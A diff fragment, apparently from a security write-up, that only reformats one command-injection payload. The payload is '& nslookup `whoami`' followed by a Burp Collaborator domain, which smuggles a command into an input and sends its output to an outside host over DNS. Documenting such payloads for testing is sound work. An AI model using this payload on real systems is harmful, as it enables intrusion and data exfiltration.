@@ -7,7 +7,7 @@
 
 Same process as above but add this payload
 
-- ``` & nslookup `whoami`.zorh37nyfzjbsg1nog7j9m16zx5ntc.burpcollaborator.net # ```
+- ` & nslookup `whoami`.zorh37nyfzjbsg1nog7j9m16zx5ntc.burpcollaborator.net # `
 
                                       or 
 
